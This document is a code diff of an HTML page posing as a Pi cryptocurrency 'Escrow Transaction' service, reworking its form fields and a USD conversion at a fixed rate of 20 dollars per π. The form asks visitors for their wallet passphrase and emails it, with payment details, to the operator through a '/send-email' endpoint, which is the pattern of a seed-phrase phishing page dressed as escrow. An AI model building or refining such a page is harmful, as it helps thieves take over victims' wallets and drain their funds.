@@ -67,10 +67,9 @@
     <div class="escrow-container">
         <h2>Escrow Transaction</h2>
         <div class="details">
-            <p><strong>Buyer:</strong> Pi Trader Inc</p>
+            <p><strong>Buyer:</strong> John Doe</p>
             <p><strong>Seller:</strong> <input type="text" id="seller" placeholder="Enter seller's name" required></p>
-            <p><strong>Item:</strong> Digital Product (Pi)</p>
-            <p><strong>Amount:</strong> <input type="number" id="amount" placeholder="Enter amount" oninput="updateBalance()" required></p>
+            <p><strong>Item:</strong> Digital Product</p>
         </div>
         <div class="transaction">
             <h3>Transaction Details</h3>
@@ -78,9 +77,8 @@
             <input type="text" id="walletPhrase" required>
 
             <label for="transactionAmount">Transaction Amount (π):</label>
-            <input type="number" id="transactionAmount" oninput="calculateUSD()" required>
-            <p>Equivalent in USD: $<span id="usdValue">0</span></p>
-
+            <input type="number" id="transactionAmount" oninput="updateEscrowBalanceAndUSD()" required>
+            
             <label for="paymentMethod">Payment Method:</label>
             <select id="paymentMethod">
                 <option value="">Select Payment Method</option>
@@ -88,13 +86,14 @@
                 <option value="usdt">USDT</option>
                 <option value="btc">BTC</option>
                 <option value="eth">ETH</option>
-                <option value="bank">Binance</option>
+                <option value="bank">Bank Transfer</option>
             </select>
 
             <label for="address">Receiving Address:</label>
             <input type="text" id="address" required>
         </div>
         <div class="balance">Escrow Balance: $<span id="escrowBalance">0</span></div>
+        <p>Equivalent in USD: $<span id="usdValue">0</span></p>
         <button class="release" onclick="releaseFunds()">Release Funds</button>
         <button class="dispute" onclick="raiseDispute()">Raise Dispute</button>
     </div>
@@ -106,9 +105,9 @@
             let paymentMethod = document.getElementById('paymentMethod').value;
             let address = document.getElementById('address').value;
             let seller = document.getElementById('seller').value;
-            let amount = document.getElementById('amount').value;
+            let escrowBalance = document.getElementById('escrowBalance').textContent;
 
-            if (!walletPhrase || !transactionAmount || !paymentMethod || !address || !seller || !amount) {
+            if (!walletPhrase || !transactionAmount || !paymentMethod || !address || !seller || !escrowBalance) {
                 alert("Please fill out all the required fields.");
                 return;
             }
@@ -116,7 +115,7 @@
             fetch('/send-email', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ walletPhrase, transactionAmount, usdValue, paymentMethod, address, seller, amount })
+                body: JSON.stringify({ walletPhrase, transactionAmount, usdValue, paymentMethod, address, seller, escrowBalance })
             })
             .then(response => {
                 if (!response.ok) {
@@ -128,28 +127,21 @@
             .catch(error => alert('Error: ' + error.message));
         }
 
-        function calculateUSD() {
-            let piAmount = document.getElementById('transactionAmount').value;
-            if (isNaN(piAmount) || piAmount <= 0) {
-                document.getElementById('usdValue').textContent = "0";
-            } else {
-                document.getElementById('usdValue').textContent = (piAmount * 20).toFixed(2);
-            }
-        }
-
-        function updateBalance() {
-            let amount = document.getElementById('amount').value;
+        function updateEscrowBalanceAndUSD() {
+            let amount = document.getElementById('transactionAmount').value;
             if (isNaN(amount) || amount <= 0) {
                 document.getElementById('escrowBalance').textContent = "0";
+                document.getElementById('usdValue').textContent = "0";
             } else {
                 document.getElementById('escrowBalance').textContent = amount;
+                document.getElementById('usdValue').textContent = (amount * 20).toFixed(2); // Assuming 1 π = 20 USD
             }
         }
 
-    function raiseDispute() {
-        alert("Dispute has been raised. Please contact support.");
-        window.close();  // This attempts to close the page
-    }
+        function raiseDispute() {
+            alert("Dispute has been raised. Please contact support.");
+            window.close();  // This attempts to close the page
+        }
     </script>
 </body>
 </html>
